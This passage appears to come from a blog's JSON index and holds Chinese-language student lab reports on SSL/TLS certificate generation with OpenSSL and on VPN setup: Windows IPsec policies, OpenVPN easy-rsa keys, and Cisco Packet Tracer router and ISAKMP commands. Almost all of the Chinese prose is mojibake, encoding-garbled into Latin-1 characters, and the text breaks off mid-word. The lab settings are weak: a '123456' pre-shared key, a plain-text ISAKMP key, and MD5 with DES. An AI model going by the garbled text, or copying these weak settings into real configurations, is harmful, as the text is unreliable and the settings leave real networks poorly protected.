ca.crt\nå»ºç«‹CAç›¸åº”ç›®å½•è¿›å…¥åˆ°keyæ–‡ä»¶å¤¹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š\n1 2 3 4 5 mkdir demoCA cd demoCA mkdir newcerts touch index.txt echo â€˜01â€™ \u0026gt; serial ç”Ÿæˆserverç«¯è¯ä¹¦\nè¿›å…¥keyæ–‡ä»¶å¤¹,ç”Ÿæˆserverç§é’¥\nopenssl genrsa -out server.key 2048\nä½¿ç”¨serverç§é’¥ç”Ÿæˆserverç«¯è¯ä¹¦è¯·æ±‚æ–‡ä»¶: openssl req -new -key server.key -out server.csr\nä½¿ç”¨serverè¯ä¹¦è¯·æ±‚æ–‡ä»¶é€šè¿‡CAç”Ÿæˆè‡ªç­¾åè¯ä¹¦\nopenssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key\néªŒè¯serverè¯ä¹¦\nopenssl verify -CAfile ca.crt server.crt\nç»“æœ\nç”Ÿæˆäº†æ­£ç¡®çš„è¯ä¹¦æ–‡ä»¶åï¼Œç¬”è€…æŠŠæ–‡ä»¶åŠ è½½åˆ°ç¨‹åºä¸­ï¼Œè®¾ç½®ipåœ°å€ä¸ºå½“å‰çš„ipv4çš„åœ°å€ï¼Œè®¾ç½®ç«¯å£ï¼Œä¸€å°ç”µè„‘å…ˆè¿è¡ŒæœåŠ¡å™¨ï¼Œä¸€å°ç”µè„‘å†è¿è¡Œå®¢æˆ·ç«¯ï¼Œè¿è¡ŒæˆåŠŸï¼Œç»“æœå¦‚ä¸‹ï¼š 0x04 æ€»ç»“ é€šè¿‡Wiresharkå¯¹TLSçš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹è¿›è¡Œåˆ†æï¼Œå¯¹TLSçš„ä½œç”¨æœºç†ç†è§£æ›´ä¸ºé€å½»ã€‚ é€šè¿‡Ubuntuä¸­å¯¹opensslå·¥å…·çš„é…ç½®ï¼Œå¹¶ä¸”åˆ†åˆ«åˆ©ç”¨cå’Œpythonå¯¹opensslè¿›è¡Œå®é™…ç»ƒä¹ ï¼Œå¯¹sslçš„ä½œç”¨è¿‡ç¨‹æ›´ä¸ºæ˜æ™°ã€‚ ","permalink":"http://www.reus09.top/posts/tech/ssl%E5%88%86%E6%9E%90/","summary":"0x01 å®éªŒç›®çš„ SSL/TLSåè®®åˆ†æã€‚ ç”¨wiresharkæŠ“åŒ…ï¼Œåˆ†æSSL/TLSè¿æ¥å»ºç«‹çš„å››ä¸ªé˜¶æ®µã€‚ OpenSSLå®‰è£…ã€é…ç½®å’Œæµ‹è¯•ã€‚ å®‰è£…é…ç½®O","title":"Sslåˆ†æ"},{"content":"VPNé…ç½®å®éªŒ 0x01 å®éªŒå†…å®¹ åœ¨Windows IPSECé…ç½®å®éªŒä¸­ï¼Œé€šè¿‡æŠ“åŒ…å·¥å…·æŠ“å–IKE SAå’ŒIPSEC SAå»ºç«‹è¿‡ç¨‹çš„æ•°æ®åŒ…ï¼Œå¹¶è¿›è¡Œåˆ†æï¼›æ€è€ƒï¼šIKEå¯†é’¥åå•†è¿‡ç¨‹æ˜¯å¦å­˜åœ¨å®‰å…¨å¨èƒã€‚ é‡‡ç”¨IPSecéš§é“æ¨¡å¼åœ¨ä¸¤å°ç”¨ä½œç½‘å…³çš„è®¡ç®—æœºä¹‹é—´é…ç½®VPNï¼ŒæŠ“å–ä¸¤å°è®¡ç®—æœºä¹‹é—´çš„æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹æ•°æ®çš„æœºå¯†æ€§ï¼Œæäº¤å®éªŒæ­¥éª¤å’Œåˆ†æç»“æœã€‚(æç¤ºï¼šå¯ä»¥ä½¿ç”¨ping\\net send \\telnetç­‰å‘½ä»¤è¿›è¡Œå¯¹æ¯”éªŒè¯) é…ç½®OPENVPNï¼Œåˆ©ç”¨2è‡³3å°ä¸»æœºç‹¬ç«‹å®Œæˆè™šæ‹Ÿä¸“ç½‘çš„æ­å»ºï¼Œå¹¶éªŒè¯è™šæ‹Ÿä¸“ç½‘çš„å®‰å…¨æ€§ï¼ˆç”¨æŠ“åŒ…å·¥å…·åˆ†æï¼Œæç¤ºï¼šå¯ä»¥ä½¿ç”¨ping\\net send \\telnetç­‰å‘½ä»¤è¿›è¡Œå¯¹æ¯”éªŒè¯ï¼‰ã€‚ PacketTraceré‡ŒVPNé…ç½®å®éªŒã€‚ï¼ˆé€‰åšï¼‰ 0x02 Windows IPSECé…ç½® é…ç½®ç¯å¢ƒï¼šwindows xp \u0026amp; windows 7 æŸ¥çœ‹win xpå’Œwin 7çš„IPåœ°å€ windows xp : 192.168.195.131 windows 7 : 192.168.195.176 2.1 windows xp IPSECé…ç½® æ‰“å¼€windows xpè™šæ‹Ÿæœºï¼Œé€šè¿‡secpol.mscæ‰“å¼€æœ¬åœ°å®‰å…¨è®¾ç½®\nåœ¨IPå®‰å…¨ç­–ç•¥ä¸‹å³é”®ï¼Œåˆ›å»ºå®‰å…¨ç­–ç•¥\nè®¾ç½®é…ç½®åç§°ä¸ºreus09\næ¿€æ´»é»˜è®¤å“åº”è§„åˆ™ èº«ä»½è®¤è¯æ–¹æ³•é‡‡ç”¨æ­¤å­—ç¬¦ä¸²ç”¨æ¥ä¿æŠ¤å¯†é’¥äº¤æ¢ï¼Œè¾“å…¥123456 å›åˆ°åŸæ¥çª—å£ï¼Œé¼ æ ‡å³é”®ï¼ŒæŒ‡æ´¾\né¼ æ ‡å³é”®ï¼Œå±æ€§ï¼Œæ·»åŠ è§„åˆ™å¹¶è¿›è¡Œç›¸åº”çš„é…ç½®\né€‰æ‹©æ­¤è§„åˆ™ä¸æŒ‡å®šéš§é“\né€‰æ‹©æ‰€æœ‰ç½‘ç»œè¿æ¥\nèº«ä»½éªŒè¯æ–¹æ³•é‡‡ç”¨æ­¤å­—ç¬¦ä¸²ç”¨æ¥ä¿æŠ¤å¯†é’¥äº¤æ¢ï¼Œè¾“å…¥å­—ç¬¦ä¸²ï¼š123456\nIPç­›é€‰åˆ—è¡¨é€‰æ‹©æ‰€æœ‰IPé€šè®¯é‡\nç­›é€‰å™¨æ“ä½œé€‰æ‹©éœ€è¦å®‰å…¨\nç‚¹å‡»ä¸‹ä¸€æ­¥å®Œæˆ\nè‡³æ­¤ï¼ŒWindows xpä¸‹çš„IPSECé…ç½®å®Œæˆï¼Œæ“ä½œè¿‡ç¨‹ä¸­æ²¡æœ‰æŠ¥é”™ã€‚\n2.2 windows 7 IPSECé…ç½® ä»¥åŒæ ·çš„æ–¹å¼é…ç½®windows 7ä¸‹çš„IPSECï¼Œè¿™é‡Œä¸windows xpé…ç½®å¤§è‡´ç›¸åŒï¼Œæˆªå›¾åªç”¨äºè¯´æ˜ä¸åŒç‚¹ã€‚é€šè¿‡secpol.mscæ‰“å¼€windows 7æœ¬åœ°å®‰å…¨è®¾ç½® åœ¨IPå®‰å…¨ç­–ç•¥ä¸‹å³é”®ï¼Œåˆ›å»ºå®‰å…¨ç­–ç•¥ è®¾ç½®é…ç½®åç§°ä¸ºreus09ï¼ˆä¸ªäººéšæ„ï¼‰ï¼Œç”±äºæ¿€æ´»é»˜è®¤å“åº”è§„åˆ™ä»…é™äºwindowsæ—©æœŸç‰ˆæœ¬ï¼Œæ•…ä¸é€‰æ‹©æ¿€æ´»é»˜è®¤å“åº”è§„åˆ™ï¼Œè¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰èº«ä»½è®¤è¯é€‰æ‹© ç‚¹å‡»é»˜è®¤è®¾ç½®ï¼Œä¸€ç›´åˆ°å±æ€§çª—å£ï¼Œæ·»åŠ è§„åˆ™ï¼šé€‰æ‹©æ­¤è§„åˆ™ä¸æŒ‡å®šéš§é“ã€é€‰æ‹©æ‰€æœ‰ç½‘ç»œè¿æ¥ã€åœ¨IPç­›é€‰åˆ—è¡¨ä¸­ç‚¹å‡»æ·»åŠ ï¼Œåç§°ä¸ºæ–°IPç­›é€‰åˆ—è¡¨ï¼Œå¹¶ç‚¹å‡»æ·»åŠ ï¼Œä¹‹åé€‰æ‹©é»˜è®¤æ“ä½œ é€‰æ‹©åˆšåˆšå»ºç«‹çš„IPç­›é€‰åˆ—è¡¨ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ é€‰æ‹©æ·»åŠ IPç­›é€‰å™¨æ“ä½œ, é€‰æ‹©åå•†å®‰å…¨,ç»§ç»­é»˜è®¤æ“ä½œ é€‰æ‹©åˆšåˆšå»ºç«‹çš„æ–°ç­›é€‰å™¨æ“ä½œï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ èº«ä»½éªŒè¯æ–¹æ³•é‡‡ç”¨æ­¤å­—ç¬¦ä¸²ç”¨æ¥ä¿æŠ¤å¯†é’¥äº¤æ¢ï¼Œè¾“å…¥å­—ç¬¦ä¸²ï¼š123456(ä¸ä¸Šé¢çš„ç›¸åŒ) å•å‡»ä¸‹ä¸€æ­¥ï¼Œé€‰æ‹©é»˜è®¤æ“ä½œç›´è‡³ç­›é€‰å™¨é…ç½®å®Œæˆ å›åˆ°åŸæ¥çª—å£ï¼Œé¼ æ ‡å³é”®ï¼Œåˆ†é…ï¼Œè‡³æ­¤ï¼ŒWindows 7ä¸‹çš„IPSECé…ç½®å®Œæˆï¼Œæ“ä½œè¿‡ç¨‹ä¸­æ²¡æœ‰æŠ¥é”™ 2.3 å¼€å§‹é€šä¿¡ å…³é—­win 7çš„IPSECæœåŠ¡ ä½¿ç”¨win 7 ping win xpï¼Œè¯·æ±‚è¶…æ—¶ï¼Œpingä¸é€š å¯¹é€šä¿¡è¿‡ç¨‹è¿›è¡ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°win 7ä¸€ç›´è¯·æ±‚IPsec SAä½†æ€»ä¸æˆåŠŸ é‡æ–°å¼€å¯win 7çš„IPSECæœåŠ¡ 2.3.1 é»˜è®¤å®‰å…¨ç­–ç•¥ ä½¿ç”¨win 7é‡æ–°ping win xpï¼Œå‘ç°æˆåŠŸpingé€š å¯¹é€šä¿¡è¿‡ç¨‹è¿›è¡ŒæŠ“åŒ…ï¼Œç”±äºæ­¤æ—¶win xpå’Œwin7éƒ½é‡‡ç”¨çš„æ˜¯é»˜è®¤çš„espåŠ å¯†ï¼Œæ‰€ä»¥æŠ“åŒ…æ˜¾ç¤ºçš„æ˜¯espåŒ… 2.3.2 ä»…AHé€šä¿¡,ä¸ç»è¿‡ESPåŠ å¯† Win 7å’Œwin xpéƒ½è®¾ç½®ä»…AHé€šä¿¡ï¼Œä¸ç»è¿‡ESPåŠ å¯† window 7 windows xp ç»§ç»­ä½¿ç”¨win 7 ping win xp å¯¹é€šä¿¡è¿‡ç¨‹è¿›è¡ŒæŠ“åŒ…ï¼Œå‘ç°æ²¡æœ‰ESPåŠ å¯†åæ•°æ®åŒ…æ ¼å¼ä¸ºICMPï¼Œæ•°æ®ä¸ºabcdef 2.3.3 Win 7å’Œwin xpä»…espè®¤è¯ windows 7 windows xp å¯ä»¥çœ‹åˆ°æ²¡æœ‰espåŠ å¯†åçš„æ•°æ®æ˜¯abcdefg åŒæ—¶ä¹Ÿå¯ä»¥æ³¨æ„åˆ°å¼€å¯espåŠ å¯†ä¹‹åçš„espåŠ å¯†çš„æ•°æ®è¢«åŠ å¯†éšè—äº† 2.3.4 åˆ†æIKE SAå’ŒIPSEC SAå»ºç«‹è¿‡ç¨‹ è¦å»ºç«‹IPSecè¿æ¥ï¼Œé¦–å…ˆè¦åå•†ä¸€ä¸ªIKE SAï¼Œç„¶ååœ¨IKE SAçš„åŸºç¡€ä¸Šåå•†IPSec SA IKE SAå»ºç«‹åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µ SAäº¤æ¢ï¼Œåå•†ç¡®è®¤æœ‰å…³å®‰å…¨ç­–ç•¥ã€‚è¯¥è¿‡ç¨‹è¿›è¡Œå®‰å…¨åå•† å¯†é’¥äº¤æ¢é˜¶æ®µï¼Œä¸»è¦äº¤æ¢å¯†é’¥Diffie-Hellmanå…¬å…±å€¼ã€‚æ•°æ®åŒ…ä¸­çš„Key Exchangeç”¨äºäº¤æ¢å„è‡ªåŠ å¯†ç”Ÿæˆçš„ä¸»å¯†é’¥ï¼›Nonceä½¿ç”¨äº†éšæœºæ•°ï¼Œé˜²æ­¢é‡æ”¾æ”»å‡»ï¼›åŠ å¯†æ‰€ç”¨çš„å¯†é’¥ä¸ºipsecä¸­è®¾å®šçš„é¢„å…±äº«å¯†é’¥ï¼› NAT-Dä¸ºåŒæ–¹çš„ip+ç«¯å£çš„Hashå€¼ã€‚ IDä¿¡æ¯å’Œè®¤è¯æ•°æ®äº¤æ¢ï¼Œè¿›è¡Œèº«ä»½è®¤è¯ï¼Œå¯¹ç¬¬ä¸€é˜¶æ®µäº¤æ¢å†…å®¹çš„è®¤è¯ã€‚ IPSec SAå»ºç«‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œéƒ½æ˜¯åŠ å¯†æ•°æ®ï¼Œæ— æ³•æŸ¥çœ‹ã€‚ç”¨åˆ°äº†Quick-Modeï¼Œç›®çš„æ˜¯åœ¨ä¸¤ä¸ªå¯¹ç­‰ä½“é—´åå•†ä¸€ç»„ä¸€è‡´çš„å‚æ•°æ¥åˆ›å»ºIPSec SAï¼Œç”¨äºçœŸå®æ•°æ®çš„åŠ è§£å¯†ï¼Œå¹¶ä¸”åœ¨æ­¤è¿›è¡ŒPFSï¼ŒPFSåŠåœ¨Quick-Modeé‡æ–°åšDHçš„äº¤æ¢ï¼Œäº§ç”Ÿæ–°çš„å¯†é’¥ç”¨äºIPSecæ•°æ®çš„åŠ å¯†ã€‚ 2.3.5 æ€è€ƒ Qï¼šIKEå¯†é’¥åå•†è¿‡ç¨‹æ˜¯å¦å­˜åœ¨å®‰å…¨å¨èƒï¼Ÿ Aï¼šIPSecå¯†é’¥äº¤æ¢è¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªç‹¬ç«‹é˜¶æ®µã€‚ç¬¬ä¸€é˜¶æ®µé€šä¿¡åŒæ–¹å½¼æ­¤å»ºç«‹ä¸€ä¸ªé€šè¿‡èº«ä»½è®¤è¯å’Œå®‰å…¨ä¿æŠ¤çš„éš§é“ï¼Œç§°ä¸ºISAKMP SAã€‚åªè¦ISAKMP SAå»ºç«‹èµ·æ¥ï¼Œæ‰€æœ‰å‘èµ·æ–¹å’Œåº”ç­”æ–¹ä¹‹é—´çš„IKEé€šä¿¡ä¿¡æ¯éƒ½é€šè¿‡åŠ å¯†ã€å®Œæ•´æ€§æ£€æŸ¥å’Œè®¤è¯çš„æ–¹æ³•å—åˆ°ä¿æŠ¤ã€‚ç¬¬äºŒé˜¶æ®µçš„å»ºç«‹æ˜¯ä¸ºç‰¹å®šçš„Internetå®‰å…¨åè®®(å¦‚IPSecç­‰)åˆ›å»ºå®‰å…¨å…³è”(IPSec SA)ã€‚IKEç¬¬ä¸€é˜¶æ®µçš„ç›®çš„æ˜¯å»ºç«‹ä¸€ä¸ªå®‰å…¨éš§é“ï¼Œä½¿å¾—ç¬¬äºŒé˜¶æ®µçš„åå•†å¯ä»¥ç§˜å¯†åœ°è¿›è¡Œã€‚ä¸¤å°ä¸»æœºä¹‹é—´å¯ä»¥åŒæ—¶å»ºç«‹å¤šä¸ªISAKMP SAï¼Œä¸€ä¸ªISAKMP SAä¹Ÿå¯ä»¥åˆ›å»ºå¤šä¸ªIPSec SAï¼ŒISAKMP SAçš„ç»“æŸä¸ä¼šå½±å“å®ƒåˆ›å»ºçš„IPSec SAå‘ç”Ÿä½œç”¨ã€‚è¿™ç§å¯†é’¥åå•†è¿‡ç¨‹æ˜¯å­˜åœ¨ç€æ¼æ´çš„ï¼Œå¯ä»¥é€šè¿‡ä¸­é—´äººæ”»å‡»å’Œæ‹’ç»æœåŠ¡æ”»å‡»å®ç°æ¼æ´åˆ©ç”¨ã€‚ 0x03 é…ç½®OPENVPN 4.1 ç½‘ç»œç¯å¢ƒ æœåŠ¡å™¨ç«¯ Windows xp: 192.168.195.131 client IP :192.168.195.131 4.2 ç¯å¢ƒä¿®æ”¹ æŠŠ easy-rsa ç›®å½•ä¸‹çš„ vars.bat.sample æ”¹åä¸º vars.batï¼Œå¹¶ä¸”ä¿®æ”¹å…¶å†…å®¹\næŠŠ easy-rsa ä¸‹çš„ openssl.cnf.sample æ”¹æˆ openssl.cnfã€‚\nç„¶åè¿›å…¥ cmd.exe\nç”Ÿæˆ Root CA\næ ¼å¼: build-ca.bat\nè¾“å‡º: keys/ca.crt keys/ca.key\nç”Ÿæˆ dh1024.pem æ–‡ä»¶ï¼ŒServer ä½¿ç”¨ TLS å¿…é¡»ä½¿ç”¨çš„ä¸€ä¸ªæ–‡ä»¶ã€‚\næ ¼å¼: build-dh.bat\nè¾“å‡º: keys/dh1024.pem\nä¸‹é¢ç”ŸæˆæœåŠ¡ç«¯è¯ä¹¦ã€å®¢æˆ·ç«¯è¯ä¹¦å’Œ TA è¯ä¹¦ï¼š\nä¸‹é¢å¼€å§‹ç”Ÿæˆ Server ä½¿ç”¨çš„è¯ä¹¦äº†ï¼š\næ ¼å¼: build-key-server.bat è¾“å‡º: keys/.crt .csr .key\nä¸‹é¢å¼€å§‹ä¸º client åŠæ³•è¯ä¹¦ï¼š\næ ¼å¼: build-key.bat è¾“å‡º: keys/.crt keys/.csr keys/.key\nä¸‹é¢ç”Ÿæˆ ta.key æ–‡ä»¶\næ ¼å¼: openvpn \u0026ndash;genkey \u0026ndash;secret keys/ta.key\nè¾“å‡º: keys/ta.key\næœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„é…ç½®:\nserver.opvné…ç½® æŠŠ easy-rsa\\keys\\ä¸‹çš„ ca.crt server.crt server.key ta.key dh1024.pemå¤åˆ¶åˆ° server.ovpn æ‰€åœ¨ç›®å½•ã€‚ å¯ä»¥çœ‹åˆ°serverç«¯è¿æ¥ï¼šVPNçš„IPä¸º10.8.0.0 Client\nclient.opvné…ç½® æœåŠ¡ç«¯ä¸»æœº easy-rsa/keys ä¸‹çš„ ca.crt client.crt client.key ta.key ä¸€èµ·æ”¾åˆ°å®¢æˆ·æœºçš„\u0026lt;OPENVPN_HOME\u0026gt;\\config ç›®å½•ä¸‹ã€‚ è¿æ¥æ•ˆæœå›¾ 4.3 è¿æ¥æµ‹è¯• 0x04 PacketTrace VPNé…ç½® 5.1 å®éªŒç¯å¢ƒ ç³»ç»Ÿï¼šWindows xp è½¯ä»¶å·¥å…·ï¼šæ€ç§‘å®˜æ–¹æ¨¡æ‹Ÿå™¨Packet Tracer 5.3 æ¨¡æ‹Ÿå®ä½“ï¼š2å°cisco2800ç³»åˆ—è·¯ç”±å™¨ã€2å°24ç«¯å£ä»¥å¤ªç½‘äº¤æ¢æœºå’Œè‹¥å¹²PCç”µè„‘ 5.2 åˆå§‹åŒ–è·¯ç”±å™¨ å®‰è£…Packet Tracer 5.3\né…ç½®å®‰å…¨ç­–ç•¥\næ–°å»ºä¸€æ¡å®‰å…¨ç­–ç•¥PacketTracerï¼Œæ·»åŠ IPå®‰å…¨è§„åˆ™ï¼Œéš§é“æ–¹å¼ä¸ºä¸æŒ‡å®šéš§é“ï¼Œç½‘ç»œç±»å‹é€‰æ‹©æ‰€æœ‰ç½‘ç»œè¿æ¥ï¼Œèº«ä»½éªŒè¯æ–¹æ³•é€‰æ‹©ç”¨å­—ç¬¦ä¸²ä¿æŠ¤å¯†é’¥äº¤æ¢ï¼Œè¾“å…¥ï¼š123456ï¼›è¿›å…¥IPç­›é€‰å™¨åˆ—è¡¨çš„é…ç½®é¡¹ï¼Œè®¾ç½®ä¸€ä¸ªæ–°çš„IPç­›é€‰å™¨åˆ—è¡¨ï¼Œæ–°å»ºä¸€ä¸ªIPç­›é€‰å™¨ï¼Œå°†æˆ‘çš„IPåœ°å€ä½œä¸ºæºåœ°å€ï¼Œå°†ä»»ä½•IPåœ°å€ä½œä¸ºç›®æ ‡åœ°å€ï¼Œåœ¨é€‰æ‹©åè®®ç±»å‹ä¸­é€‰ä¸­ä»»æ„ï¼Œæ–°å»ºä¸€ä¸ªç­›é€‰æ“ä½œï¼Œè®¾ç½®ä¸ºåå•†å®‰å…¨ï¼Œé€‰ä¸­ä¸å’Œä¸æ”¯æŒIPSecçš„è®¡ç®—æœºé€šè®¯ï¼Œä»¥è¦æ±‚å¿…é¡»åœ¨IPSecåŸºç¡€ä¸Šè¿›è¡Œè¿æ¥ï¼ŒIPé€šè®¯å®‰å…¨è®¾æ–½ä¸­é€‰æ‹©é€‰æ‹©è‡ªå®šä¹‰ï¼Œç„¶åç‚¹å‡»è®¾ç½®é€‰æ‹©å¦‚ä¸‹å›¾ï¼Œé€‰æ‹©é»˜è®¤ç›´è‡³é…ç½®å®Œæˆ åˆå§‹åŒ–é…ç½®è·¯ç”±å™¨\næ‰“å¼€ciscoæ¨¡æ‹Ÿå™¨ï¼Œåœ¨æ¨¡æ‹Ÿå™¨çª—å£å·¥å…·æ ä¸‹é€‰æ‹©file--newã€‚åœ¨å·¦ä¸‹è§’è®¾å¤‡æ é€‰å–è·¯ç”±å™¨ã€‚ å°†cisco2811è·¯ç”±å™¨æ‹–åˆ°å·¥ä½œåŒºåŸŸï¼Œå•å‡»å·¥ä½œåŒºåŸŸçš„è·¯ç”±å™¨å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œå¼¹å‡ºå¦‚å›¾æ‰€ç¤ºç•Œé¢ è¿›å…¥è·¯ç”±å™¨ç‰¹æƒæ¨¡å¼é…ç½®è·¯ç”±å™¨ç½‘å¡IPï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 Router\u0026gt;enable\t//è¿›å…¥ç‰¹æƒæ¨¡å¼ï¼Œåªæœ‰åœ¨ç‰¹æƒæ¨¡å¼ä¸‹æ‰å¯ä»¥å¯¹è·¯ç”±å™¨è¿›è¡Œé…ç½® Router#configure terminal\t//è¿›å…¥é…ç½®çŠ¶æ€ï¼Œé€šè¿‡ç«¯å£è¿›è¡Œé…ç½® Router(config)# interface fastEthernet 0/0\t//è¿›å…¥ç«¯å£f0/0 Router(config-if)#ip address 10.0.0.1 255.255.255.0\t#é…ç½®ç½‘å¡f0/0çš„ipåœ°å€å’Œå­ç½‘æ©ç  Router(config-if)#no shutdown\t//å¼€å¯ç«¯å£f0/0 Router(config-if)#end\t//è¿”å›ç‰¹æƒæ¨¡å¼ Router#configure terminal\t//è¿›å…¥é…ç½®çŠ¶æ€ï¼Œé€šè¿‡ç«¯å£è¿›è¡Œé…ç½® Router(config)# interface fastEthernet 0/1 //è¿›å…¥ç«¯å£f0/1 Router(config-if)#ip address 192.168.1.1 255.255.255.0 //é…ç½®ç½‘å¡f0/1çš„ipåœ°å€å’Œå­ç½‘æ©ç  Router(config-if)#no shutdown\t//å¼€å¯ç«¯å£f0/1 Router(config-if)#end\t//è¿”å›ç‰¹æƒæ¨¡å¼ åˆå§‹é…ç½®router 0å®Œæˆï¼Œæ ¹æ®router 0çš„é…ç½®è¿‡ç¨‹å®Œæˆrouter 1çš„é…ç½®ï¼Œå…¶ä¸­router 1çš„f0/0ç«¯å£IPä¸º10.0.0.2/24, router 1çš„f0/1ç«¯å£çš„IPåœ°å€ä¸º192.168.2.1/24\né…ç½®å®Œæˆåï¼Œç‚¹å‡»é€‰æ‹©å°†router 0å’Œrouter 1çš„f0/0ç«¯å£è¿æ¥\n5.3 æ­å»ºç½‘ç»œç¯å¢ƒ åœ¨æ¨¡æ‹Ÿå™¨å·¦ä¸‹è§’é€‰æ‹©PC\næ‹–åˆ°ç»˜å›¾å·¥ä½œåŒºï¼ŒåŒå‡»PCå›¾æ ‡ï¼Œé€‰æ‹©Desktopï¼Œå¦‚å›¾æ‰€ç¤º é€‰æ‹©IP Configurationï¼Œé…ç½®PCçš„IPåœ°å€å’Œå­ç½‘æ©ç ï¼Œå¦‚å›¾æ‰€ç¤º\né‡å¤ä¸Šè¿°æ“ä½œï¼Œé…ç½®å…­å°PCï¼Œå®ƒä»¬çš„IPåœ°å€åˆ†åˆ«ä¸º\n192.168.1.10 192.168.1.20 192.168.1.30 192.168.2.10 192.168.2.20 192.168.2.30 å­ç½‘æ©ç å…¨ä¸º255.255.255.0ï¼Œå‰ä¸‰å°ç½‘å…³ä¸º192.168.1.1ï¼Œåä¸‰å°ç½‘å…³ä¸º192.168.2.1\né€‰å–äº¤æ¢æœº\nå°†è·¯ç”±å™¨äºäº¤æ¢æœºç›¸è¿ï¼Œå°†äº¤æ¢æœºäºPCç›¸è¿ï¼›æœ€ç»ˆå®Œæˆå¦‚å›¾æ‰€ç¤ºçš„ç½‘ç»œå›¾ 5.4 é…ç½®è·¯ç”± åœ¨è·¯ç”±å™¨ä¸­é…ç½®è·¯ç”±ï¼Œä½¿è·¯ç”±å™¨ä¸¤ç«¯çš„ç½‘ç»œäº’é€š\né…ç½®router 0ï¼ŒåŒå‡»router 0å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œè¿›å…¥è·¯ç”±å™¨é…ç½®çª—å£ï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 Router\u0026gt;en Router#configure terminal Router(config)# ip route 0.0.0.0 0.0.0.0 fastEthernet 0/0 //é…ç½®å†…ç½‘è®¿é—®å¤–éƒ¨ç½‘ç»œçš„å‡ºå£è·¯ç”± Router(config)#ip route 192.168.1.0 255.255.255.0 fastEthernet 0/1 //é…ç½®å¤–éƒ¨è®¿é—®å†…éƒ¨ç½‘ç»œå…¥å£è·¯ç”± Router(config)#end é…ç½®router 1ï¼ŒåŒå‡»router 1å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œè¿›å…¥è·¯ç”±å™¨é…ç½®çª—å£ï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 Router\u0026gt;en Router#configure terminal Router(config)# ip route 0.0.0.0 0.0.0.0 fastEthernet 0/0 //é…ç½®å†…ç½‘è®¿é—®å¤–éƒ¨ç½‘ç»œçš„å‡ºå£è·¯ç”± Router(config)#ip route 192.168.2.0 255.255.255.0 fastEthernet 0/1 //é…ç½®å¤–éƒ¨è®¿é—®å†…éƒ¨ç½‘ç»œå…¥å£è·¯ç”± Router(config)#end 5.5 æµ‹è¯•ç½‘ç»œäº’é€šæ€§ åŒå‡»PC0å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©Desktopï¼Œé€‰æ‹©Command Prompt\nä½¿ç”¨pingå‘½ä»¤ï¼Œping 192.168.1.1ã€10.0.0.1ã€192.168.2.10ã€10.0.0.2ã€192.168.3.10ç»“æœé™¤äº†æœ€åä¸€ä¸ªåœ°å€(è¯¥åœ°å€ä¸å­˜åœ¨)å…¶å®ƒå…¨èƒ½pingé€šï¼Œè¡¨æ˜æ­å»ºçš„ç½‘ç»œæ»¡è¶³å®éªŒç¯å¢ƒ\n0x05 IPSECéš§é“æ¨¡å¼VPN 5.1 é…ç½®IPSec VPN é…ç½®router 0ï¼ŒåŒå‡»router 0å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œè¿›å…¥è·¯ç”±å™¨é…ç½®çª—å£\nå®šä¹‰IKEçš„ç­–ç•¥(router 0å’Œrouter1ä¹‹é—´çš„å¯†é’¥äº¤æ¢ç­–ç•¥)ï¼ŒIKEåªæ˜¯å¯†é’¥çš„äº¤æ¢ç­–ç•¥,åœ¨ä½¿ç”¨åŠ å¯†å¯¹ç§°å’Œéå¯¹ç§°åŠ å¯†ç®—æ³•çš„æ—¶å€™,éœ€è¦å¯†é’¥æ¥å¯¹æ•°æ®åŠ å¯†,ä¸‹é¢çš„IKEç­–ç•¥åªæ˜¯å»ºç«‹ä¸€æ¡ç®¡ç†è¿æ¥ï¼Œè´Ÿè´£åŠ å¯†ç”Ÿæˆçš„å„ç§å¯†é’¥ï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 Router#configure terminal\t//è¿›å…¥é…ç½®çŠ¶æ€ï¼Œé€šè¿‡ç«¯å£è¿›è¡Œé…ç½® Router (config)#crypto isakmp policy 10\t//ä¸€ä¸ªIKEçš„ç­–ç•¥ï¼Œå·ç æ˜¯10ï¼Œæ•°å­—è¶Šä½ï¼Œç­–ç•¥ä¼˜å…ˆçº§è¶Šé«˜ Router (config-isakmp)# authentication pre-share\t//ä½¿ç”¨é¢„å®šä¹‰å…±äº«å¯†é’¥è¿›è¡Œè®¾å¤‡è®¤è¯ Router (config-isakmp)#hash md5\t//è®¤è¯æ–¹å¼ä½¿ç”¨MD5è¿›è¡Œè®¤è¯ Router (config-isakmp)#encryption des\t//åŠ å¯†æ–¹å¼ä½¿ç”¨DESï¼Œå¯é€‰AES/DES Router (config-isakmp)#group 2\t//æŒ‡å®šDHç»„ Router (config-isakmp)# lifetime 86400\t//å¯¹ç”Ÿæˆæ–°SAçš„å‘¨æœŸè¿›è¡Œè°ƒæ•´ï¼Œä¸¤ç«¯çš„è·¯ç”±å™¨éƒ½è¦è®¾ç½®ç›¸åŒçš„SAå‘¨æœŸ Router (config-isakmp)# exit Router (config)#crypto isakmp key reus09 address 10.0.0.2 //å®šä¹‰ä¸€ä¸ªå¯†ç ,å¯†ç æ˜¯reus09ï¼Œå’Œåœ°å€ä¸º10.0.0.2çš„è®¾å¤‡å»äº¤æ¢å¯†é’¥ å®šä¹‰æ•°æ®çš„åŠ 